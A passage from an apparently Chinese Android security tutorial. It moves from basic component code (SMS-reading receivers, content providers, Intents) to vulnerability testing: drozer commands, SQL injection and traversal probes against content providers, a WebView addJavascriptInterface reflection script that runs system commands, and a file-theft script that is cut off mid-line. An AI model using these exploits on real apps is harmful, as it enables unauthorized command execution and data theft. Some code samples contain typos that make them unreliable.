class="string">public class MyReceiver extends BroadcastReceiver&#123;</span></span><br><span class="line"><span class="string">    public void onReceiver(Context context,Intent intent)&#123;</span></span><br><span class="line"><span class="string">        Log.d(&quot;</span>zxk1ng<span class="string">&quot;,&quot;</span>SmsReceiver<span class="string">&quot;);    </span></span><br><span class="line"><span class="string">        //abortBroadcast(); //终止广播 低版本安卓一个简单漏洞 高版本安卓系统已经修复</span></span><br><span class="line"><span class="string">        //短信信息 方法一</span></span><br><span class="line"><span class="string">        Bundle bundle = intent.getExtras();</span></span><br><span class="line"><span class="string">        Object[] pdus = (Object[]) bundle.get(&quot;</span>pdus<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        for(Object pdu ; pdus )&#123;</span></span><br><span class="line"><span class="string">            SmsMessage message = SmsMessage.createFromPdu((byte[])pdu);</span></span><br><span class="line"><span class="string">            String address = message.getOriginatingAddress();</span></span><br><span class="line"><span class="string">            String body = message.getMessageBody();</span></span><br><span class="line"><span class="string">            Log.d(&quot;</span>zxk1ng<span class="string">&quot;,&quot;</span>address:<span class="string">&quot;+address+&quot;</span>body:<span class="string">&quot;+body);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        //方法二：使用Telephony.Sms.Intents.getMessagesFromIntent(intent); 要求 API19</span></span><br><span class="line"><span class="string">        SmsMessage[] smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent);</span></span><br><span class="line"><span class="string">        for(SmsMessage message ; smsMessages )&#123;</span></span><br><span class="line"><span class="string">            String address = message.getOriginatingAddress();</span></span><br><span class="line"><span class="string">            String body = message.getMessageBody();</span></span><br><span class="line"><span class="string">            Log.d(&quot;</span>zxk1ng<span class="string">&quot;,&quot;</span>address:<span class="string">&quot;+address+&quot;</span>body:<span class="string">&quot;+body);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>安卓8.0以上 隐式广播(配置文件中)不一定起效，但显式广播(动态)一定可以。</p><h3 id="content-provider">content provider</h3><h4 id="简单例子">简单例子</h4><p>创建一个MyProvider类，重写ContentProvider类，注册内容提供者</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android:authorities</span>=<span class="string">&quot;包名/www.51asm.com&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android:name</span>=<span class="string">&quot;.MyProvider&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>然后新建一个工程ContentReceiver作为内容接受者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ContentResolver</span> <span class="variable">mContentResolver</span>  <span class="operator">=</span> getContentResolver();</span><br><span class="line"><span class="comment">//注册内容观察者 使用观察者要在提供者出 notifyAll()</span></span><br><span class="line">mContentResolver.registerContentObserver(Uri.parse(<span class="string">&quot;content://包名&quot;</span>),<span class="literal">true</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Button</span> <span class="variable">button_insert</span> <span class="operator">=</span> findViewById(R.id.button_insert);</span><br><span class="line">button_insert.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener()&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        <span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">        values.put(<span class="string">&quot;SID&quot;</span>,<span class="string">&quot;S004&quot;</span>);</span><br><span class="line">        values.put(<span class="string">&quot;SNAME&quot;</span>,<span class="string">&quot;日光&quot;</span>)       </span><br><span class="line">        mContentResolver.insert(Uri.parse(<span class="string">&quot;content://包名&quot;</span>),values);              </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="短信">短信</h4><p>在配置文件中设置用户权限<br><img src="assets/image-20231027144507100.png" alt="image-20231027144507100"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ManActivity中： </span></span><br><span class="line">requestPermissions(<span class="keyword">new</span> <span class="title class_">String</span>[]  &#123;Manifest.permission.SEND_SMS,</span><br><span class="line">                                 Manifest.permission.READ_SMS&#125;,<span class="number">1000</span>)；</span><br><span class="line"><span class="comment">//SmsManager smsManager = SmsManager getDefault();</span></span><br><span class="line"><span class="comment">//smsManager.sendTextMessage(&quot;5556&quot;,null,&quot;msg&quot;,null,null);</span></span><br><span class="line"><span class="type">ContentResolver</span> <span class="variable">cr</span>  <span class="operator">=</span> getContentResolver();</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改短信</span></span><br><span class="line"><span class="type">ContentValues</span> <span class="variable">values</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Contentvalues</span>();</span><br><span class="line">values.put(Telephony.Sms.Inbox.ADDRESS,<span class="string">&quot;100&quot;</span>);<span class="comment">//电话修改为110</span></span><br><span class="line">cr.update(Telephony.Sms.Inbox.CONTENT_URI,values,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取短信</span></span><br><span class="line"><span class="type">Cursor</span> <span class="variable">curson</span> <span class="operator">=</span> cr.query(Telephony.Sms.Inbox.CONTENT_URI,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span>(cursor !=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(cursor.moveToFirst())&#123;</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="type">in</span> <span class="variable">indexID</span> <span class="operator">=</span> cursor.getColumnIndex(Telephony.Sms.Inbox._ID);</span><br><span class="line">            <span class="type">in</span> <span class="variable">indexAddress</span> <span class="operator">=</span> cursor.getColumnIndex(Telephony.Sms.Inbox.ADDRESS);</span><br><span class="line">            <span class="type">in</span> <span class="variable">indexDate</span> <span class="operator">=</span> cursor.getColumnIndex(Telephony.Sms.Inbox.DATE);</span><br><span class="line">            <span class="type">in</span> <span class="variable">indexBody</span> <span class="operator">=</span> cursor.getColumnIndex(Telephony.Sms.Inbox.BODY);</span><br><span class="line">            <span class="type">String</span> <span class="variable">_ID</span> <span class="operator">=</span> cursor.getString(indexID);</span><br><span class="line">            <span class="type">String</span> <span class="variable">ADDRESS</span> <span class="operator">=</span> cursor.getString(indexAddress);</span><br><span class="line">            <span class="type">Long</span> <span class="variable">DATE</span> <span class="operator">=</span> cursor.getLong(indexDate);</span><br><span class="line">            <span class="type">String</span> <span class="variable">BODY</span> <span class="operator">=</span> cursor.getString(indexBody);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//转化时间格式 </span></span><br><span class="line">            <span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM--dd hh:mm:ss&quot;</span>);</span><br><span class="line">            simpleDateFormat.format(<span class="keyword">new</span> <span class="title class_">Date</span>(DATE));</span><br><span class="line">            Log.d(<span class="string">&quot;zxk1ng&quot;</span>,<span class="string">&quot;_ID:&quot;</span>+_ID+<span class="string">&quot; DATE:&quot;</span>+DATE+<span class="string">&quot; ADDRESS:&quot;</span>+ADDRESS+<span class="string">&quot; BODY:&quot;</span>+BODY);           </span><br><span class="line">        &#125;<span class="keyword">while</span>(cursor.moveToNext());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    Intent</p><h3 id="Intent：拨打电话">Intent：拨打电话</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener)&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        Intent intent=<span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setAction(Intent.Action_CALL);</span><br><span class="line">        intent.setData(Uri.parse(<span class="string">&quot;tel:120&quot;</span>));</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//manifests中设置用户权限 &lt;uses-permission android:name=&quot;android.intent.action.CALL_PHONE&quot;/&gt;</span></span><br><span class="line"><span class="comment">//在Android 11 中权限设置中手动给自定义app拨打电话的权限</span></span><br></pre></td></tr></table></figure><h3 id="Intent：打开浏览器">Intent：打开浏览器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener)&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        Intent intent=<span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setAction(Intent.Action_VIEW );</span><br><span class="line">        intent.setData(Uri.parse(<span class="string">&quot;网址内容&quot;</span>));</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Intent：设闹钟">Intent：设闹钟</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener)&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span>&#123;</span><br><span class="line">        Intent intent=<span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(AlarmClock.ACTION_SET_ALARM)</span><br><span class="line">            .putExtra(AlarmClock.EXTRA_MESSAGE, message)</span><br><span class="line">.putExtra(AlarmClock.EXTRA_HOUR, hour)</span><br><span class="line">.putExtra(AlarmClock.EXTRA_MINUTES, minute);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="显式Intent">显式Intent</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取intent数据 在loginactivity中写：</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line"><span class="type">String</span> <span class="variable">accout</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;key_account&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;key_password&quot;</span>);</span><br><span class="line">usernameEditText.setText(accout);</span><br><span class="line">passwordEditText.setText(password);</span><br><span class="line"></span><br><span class="line"><span class="comment">//主activity中，绑定一个button然后：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(MainActivity.<span class="built_in">this</span>,LoginActivity.class);</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_account&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_password&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">startActivity(intent); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果在login登录框中输入的信息要返回到MainActivity中，</p><p>在loginActivity中的按钮事件代码中添加相应功能：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>( );</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_account&quot;</span>,usernameEditText.getText().toString());</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_password&quot;</span>,passwordEditText.getText().toString());</span><br><span class="line">setResult(RESULT_OK,intent);</span><br><span class="line">finish();   </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在MainActivity中添加功能使其知道loginactivity何时销毁，然后接收信息。</p><p>startActivityForResult(intent)：期望在<strong>活动销毁</strong>的时候能够返回一个结果给上一个活动。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//requestCode ==&gt; 请求码，resultCode ==&gt; 返回数据时传入的处理结果 data == &gt;携带着返回数据的Intent</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onActivityResult</span><span class="params">(<span class="type">int</span> requestCode, <span class="type">int</span> resultCode, Intent data)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onActivityResult(requestCode, resultCode, data);</span><br><span class="line">    <span class="keyword">if</span>(requestCode == <span class="number">1000</span> &amp;&amp; resultCode == RESULT_OK)&#123;  <span class="comment">//1000是请求码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">accout</span> <span class="operator">=</span> data.getStringExtra(<span class="string">&quot;key_account&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> data.getStringExtra(<span class="string">&quot;key_password&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(MainActivity.<span class="built_in">this</span>,LoginActivity.class);</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_account&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_password&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">startActivityForResult(intent,<span class="number">1000</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在loginActivity中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>( );</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_account&quot;</span>,usernameEditText.getText().toString());</span><br><span class="line">intent.putExtra(<span class="string">&quot;key_password&quot;</span>,passwordEditText.getText().toString());</span><br><span class="line">setResult(RESULT_OK,intent);</span><br><span class="line">finish();   <span class="comment">//销毁</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="隐式Intent">隐式Intent</h3><p>在配置文件中自己注册意图，如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android:name</span>=<span class="string">&quot;要注册意图的Activity&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">android</span>：<span class="attr">label</span>=<span class="string">&quot;xxx&quot;</span></span></span><br><span class="line"><span class="tag">          </span></span><br><span class="line"><span class="tag">&lt;/<span class="attr">activity</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;要填入内容&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure><p>启动：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View V)</span>&#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">    intent.setAction(<span class="string">&quot;配置文件中添加的内容信息&quot;</span>)</span><br><span class="line">    intent.putExtra(<span class="string">&quot;key_account&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    intent.putExtra(<span class="string">&quot;key_password&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四大组件简单漏洞">四大组件简单漏洞</h2><h3 id="Activity-2">Activity</h3><h4 id="越权绕过"><strong>越权绕过</strong></h4><p><strong>原理</strong></p><p>在Android系统中，Activity默认是不可以导出的，如果设置了exported =&quot;true&quot;或者添加了&lt;intent<code>-</code>filter&gt;，这样Activity就变成了可导出，就会导致越权绕过或者是泄露敏感信息等安全风险。</p><p>对于漏洞检测可以使用drozer。</p><p><strong>drozer简单使用</strong></p><ul><li><p>drozer连接</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">adb</span> forward tcp:<span class="number">31415</span> tcp:<span class="number">31415</span></span><br><span class="line"><span class="attribute">drozer</span> console connect</span><br></pre></td></tr></table></figure></li><li><p>进入drozer输入list或ls，查看drozer 所有模块</p></li><li><p>查找安装包  <code>run  app.package.list -f  </code></p></li><li><p>查看安装包信息 <code>run  app.package.info -a 安装包名</code></p></li><li><p>查看暴露的组件<br>Drozer可检测apk源码四大组件（activities、broadcast receivers、content providers、services）的export情况，并判断export的组件提供那些服务(exported”表示组件可以被其他App使用)，因为服务是可以调试的，可以将调试器附加到进程上，进行调试。<br><code>run  app.package.attacksurface  安装包名</code></p></li></ul><p><code>run app.activity.info  -a  安装包名 </code></p><p><code>run app.activity.start --component 包名 组件名</code></p><p>调用组件服务 ==&gt; <code>run app.service.start --action 服务名 --component 包名 服务名</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Broadcast组件</span><br><span class="line"></span><br><span class="line">run app<span class="selector-class">.broadcast</span><span class="selector-class">.info</span> -<span class="selector-tag">a</span> &lt;package name&gt; 测试对外的broadcast组件信息</span><br><span class="line">run app<span class="selector-class">.broadcast</span><span class="selector-class">.send</span> <span class="attr">--component</span> &lt;package name&gt; &lt;component name&gt; <span class="attr">--action</span> &lt;action&gt; <span class="attr">--extra</span> &lt;type&gt; &lt;key&gt; &lt;value&gt; 发送带参数的恶意广播</span><br><span class="line">run app<span class="selector-class">.broadcast</span><span class="selector-class">.send</span> <span class="attr">--action</span> &lt;action&gt; 向广播组件发送不完整intent使用空extras，可以看到应用停止运行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Content组件</span><br><span class="line"></span><br><span class="line">run app<span class="selector-class">.provider</span><span class="selector-class">.info</span>   -<span class="selector-tag">a</span> </span><br><span class="line">run scanner<span class="selector-class">.provider</span><span class="selector-class">.findurls</span> -<span class="selector-tag">a</span> &lt;package name&gt;  扫描url</span><br><span class="line">run app<span class="selector-class">.provider</span><span class="selector-class">.query</span> uri  访问url</span><br><span class="line"></span><br><span class="line">run scanner<span class="selector-class">.provider</span><span class="selector-class">.injection</span> -<span class="selector-tag">a</span> packageName 扫描那里可以进行SQL注入</span><br><span class="line">run scanner<span class="selector-class">.provider</span><span class="selector-class">.sqltables</span> -<span class="selector-tag">a</span> com<span class="selector-class">.mwr</span><span class="selector-class">.example</span><span class="selector-class">.sieve</span> 列举app的表信息</span><br><span class="line">projection 测试：run app<span class="selector-class">.provider</span><span class="selector-class">.query</span> contentProviderURI <span class="attr">--projection</span> <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">selection 测试：run app<span class="selector-class">.provider</span><span class="selector-class">.query</span> contentProviderURI <span class="attr">--selection</span> <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">projection注入语句测试：run app<span class="selector-class">.provider</span><span class="selector-class">.query</span> contentProviderURI <span class="attr">--projection</span> <span class="string">&quot;* FROM xx;--&quot;</span></span><br><span class="line">Selection注入语句测试：run app<span class="selector-class">.provider</span><span class="selector-class">.query</span> contentProviderURI <span class="attr">--selection</span> <span class="string">&quot;1=1);--&quot;</span></span><br><span class="line"></span><br><span class="line">目录遍历漏洞检测：</span><br><span class="line">run scanner<span class="selector-class">.provider</span><span class="selector-class">.traversal</span> -<span class="selector-tag">a</span> &lt;package name&gt;</span><br></pre></td></tr></table></figure><h2 id="WebView">WebView</h2><h3 id="历史漏洞">历史漏洞</h3><p>简单说一说就是</p><ol><li><p>js和Android进行通信时，有个<code>addJavascriptInterface</code>接口进行对象映射，可以通过映射的js对象调用android对象的方法<br><strong>攻击步骤</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="string">``</span><span class="number">1</span><span class="string">``</span>）Android中的对象有一公共的方法：getClass()</span><br><span class="line">（<span class="string">``</span><span class="number">2</span><span class="string">``</span>）该方法可以获取到当前类 类型Class</span><br><span class="line">（<span class="string">``</span><span class="number">3</span><span class="string">``</span>）该类有一关键的方法： Class.forName；</span><br><span class="line">（<span class="string">``</span><span class="number">4</span><span class="string">``</span>）该方法可以加载一个类（可加载 java.lang.Runtime 类）</span><br><span class="line">（<span class="string">``</span><span class="number">5</span><span class="string">``</span>）而该类是可以执行本地命令的</span><br></pre></td></tr></table></figure></li></ol><p>​  攻击脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">execute</span><span class="params">(cmdArgs)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">// 步骤1：遍历 window 对象</span></span><br><span class="line">    <span class="comment">// 目的是为了找到包含 getClass （）的对象</span></span><br><span class="line">    <span class="comment">// 因为Android映射的JS对象也在window中，所以肯定会遍历到</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> obj in window) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> in window[obj]) &#123; </span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 步骤2：利用反射调用forName（）得到Runtime类对象</span></span><br><span class="line">            alert(obj);         </span><br><span class="line">            <span class="keyword">return</span>  window[obj].getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>) </span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 步骤3：以后，就可以调用静态方法来执行一些命令，比如访问文件的命令</span></span><br><span class="line">getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(cmdArgs); </span><br><span class="line"> </span><br><span class="line"><span class="comment">// 从执行命令后返回的输入流中得到字符串，有很严重暴露隐私的危险。</span></span><br><span class="line"><span class="comment">// 如执行完访问文件的命令之后，就可以得到文件名的信息了。</span></span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.webview默认开启密码保存，会保存在 <code>/data/data/com.package.name/databases/webview.db</code></p><h3 id="跨域漏洞">跨域漏洞</h3><h4 id="任意文件窃取"><strong>任意文件窃取</strong></h4><p><strong>原理</strong>：setAllowFileAccess(true) + setAllowFileAccessFromFileURLs(true)</p><p>这样使webview可以使用File协议，且加载的js脚本文件可以访问本地文件</p><p><strong>复现</strong>：获得/etc/hosts中私有文件信息</p><p>编写js脚本</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadXMLDoc</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> arm = <span class="string">&quot;file:///etc/hosts&quot;</span>;  </span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.<span class="property">onreadystatechange</span>=<span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//alert(&quot;status 